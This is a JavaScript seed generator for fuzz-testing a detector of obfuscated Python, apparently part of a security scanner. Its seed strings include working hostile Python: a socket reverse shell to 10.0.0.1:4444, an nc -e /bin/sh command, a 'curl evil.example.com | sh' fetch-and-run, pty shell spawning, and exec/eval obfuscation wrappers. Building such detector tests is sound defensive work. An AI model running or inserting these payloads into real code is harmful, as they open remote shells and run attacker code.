'use strict';
// ════════════════════════════════════════════════════════════════════════════
// grammars/python-grammar.js — deterministic seed generator for Python
// obfuscation (the python-obfuscation.js surface). Covers the 10
// TECHNIQUE strings emitted: exec/zlib, exec/marshal, codecs.decode,
// chr-join / bytes-list / chr-concat reassembly, builtin string-concat,
// subprocess / os.system / pty.spawn / socket reverse shell sinks.
// ════════════════════════════════════════════════════════════════════════════

const PYTHON_TECHNIQUE_CATALOG = Object.freeze([
  'Python exec(zlib.decompress(b64))',
  'Python exec(marshal.loads(b64))',
  "Python codecs.decode('rot_13')",
  "Python codecs.decode('rot13')",
  "Python codecs.decode('base64')",
  "Python codecs.decode('hex')",
  "Python codecs.decode('zlib')",
  'Python chr-join Reassembly',
  'Python bytes-list Reassembly',
  'Python chr-concat Reassembly',
  'Python Builtin String-Concat',
  'Python subprocess Sink',
  'Python os.system Sink',
  'Python pty.spawn Shell-Upgrade',
  'Python Socket Reverse-Shell',
]);

function makeRng(seed) {
  let s = (seed | 0) || 0x70E17A00;
  return {
    next() { s ^= s << 13; s ^= s >>> 17; s ^= s << 5; return s >>> 0; },
    int(n) { return this.next() % Math.max(1, n); },
  };
}

function makeSeed(text, expectedSubstring) {
  const buf = Buffer.from(text, 'utf8');
  if (expectedSubstring) {
    Object.defineProperty(buf, '_expectedSubstring', {
      value: expectedSubstring,
      enumerable: false,
    });
  }
  return buf;
}

// Helper: base64 of a payload string (node Buffer).
function b64(s) { return Buffer.from(s, 'utf8').toString('base64'); }

// ── Branch generators ─────────────────────────────────────────────────────

function genExecZlib() {
  // exec(zlib.decompress(base64.b64decode(b'…')))
  // We don't need the zlib payload to actually decompress — the finder
  // recognises the pattern shape and the decoder attempts Decompressor.
  // A structurally-correct base64 of a zlib frame keeps the fuzz honest.
  const out = [];
  // Structure-only: the finder matches on the exec(zlib.decompress(b64decode(b'…')))
  // shape regardless of payload validity.
  out.push(makeSeed(
    "import zlib, base64\nexec(zlib.decompress(base64.b64decode(b'" + b64('aGVsbG8=') + "')))",
    'zlib.decompress',
  ));
  out.push(makeSeed(
    "exec(zlib.decompress(base64.b64decode('" + b64('x') + "')))",
    'zlib.decompress',
  ));
  return out;
}

function genExecMarshal() {
  return [
    makeSeed(
      "import marshal, base64\nexec(marshal.loads(base64.b64decode(b'" + b64('payload') + "')))",
      'marshal.loads',
    ),
  ];
}

function genCodecsDecode() {
  // codecs.decode('…', 'rot_13') / 'base64' / 'hex' / 'zlib'
  const out = [];
  out.push(makeSeed(
    "import codecs\nx = codecs.decode('jubnzv', 'rot_13')\nexec(x)",
    'whoami',  // rot13('jubnzv') == 'whoami'
  ));
  out.push(makeSeed(
    "import codecs\ny = codecs.decode('" + b64('whoami') + "', 'base64')",
    'whoami',
  ));
  out.push(makeSeed(
    "import codecs\nz = codecs.decode('77686f616d69', 'hex')",
    'whoami',
  ));
  return out;
}

function genChrJoin() {
  // ''.join(chr(x) for x in [119, 104, 111, 97, 109, 105])  # 'whoami'
  return [
    makeSeed(
      "payload = ''.join(chr(x) for x in [119, 104, 111, 97, 109, 105])\nexec(payload)",
      'whoami',
    ),
    makeSeed(
      "cmd = ''.join([chr(i) for i in [99, 117, 114, 108]])",
      'curl',
    ),
  ];
}

function genBytesList() {
  // bytes([119, 104, 111, 97, 109, 105]).decode()
  return [
    makeSeed(
      "exec(bytes([119, 104, 111, 97, 109, 105]).decode())",
      'whoami',
    ),
    makeSeed(
      "payload = bytes([99, 117, 114, 108]).decode('utf-8')",
      'curl',
    ),
  ];
}

function genChrConcat() {
  // chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105)  # 'whoami'
  return [
    makeSeed(
      "eval(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))",
      'whoami',
    ),
  ];
}

function genBuiltinConcat() {
  // getattr(__builtins__, 'e'+'val')('whoami')
  return [
    makeSeed(
      "getattr(__builtins__, 'e'+'val')('import os; os.system(\"whoami\")')",
      'eval',
    ),
    makeSeed(
      "getattr(__builtins__, 'ex'+'ec')(payload)",
      'exec',
    ),
  ];
}

function genSubprocessSink() {
  return [
    makeSeed(
      "import subprocess\nsubprocess.Popen(['nc', '-e', '/bin/sh', '10.0.0.1', '4444'])",
      'subprocess',
    ),
    makeSeed(
      "subprocess.check_output(['whoami'], shell=True)",
      'whoami',
    ),
  ];
}

function genOsSystemSink() {
  return [
    makeSeed(
      "import os\nos.system('curl http://evil.example.com/x | sh')",
      'os.system',
    ),
  ];
}

function genPtySpawn() {
  return [
    makeSeed(
      "import pty\npty.spawn('/bin/bash')",
      'pty.spawn',
    ),
  ];
}

function genSocketReverseShell() {
  return [
    makeSeed(
      "import socket,subprocess,os\n"
      + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
      + "s.connect(('10.0.0.1',4444))\n"
      + "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
      + "subprocess.call(['/bin/sh','-i'])",
      'socket',
    ),
  ];
}

function generatePythonSeeds() {
  const rng = makeRng(0x70E17A00);
  void rng;
  return [
    ...genExecZlib(),
    ...genExecMarshal(),
    ...genCodecsDecode(),
    ...genChrJoin(),
    ...genBytesList(),
    ...genChrConcat(),
    ...genBuiltinConcat(),
    ...genSubprocessSink(),
    ...genOsSystemSink(),
    ...genPtySpawn(),
    ...genSocketReverseShell(),
  ];
}

module.exports = { generatePythonSeeds, PYTHON_TECHNIQUE_CATALOG };
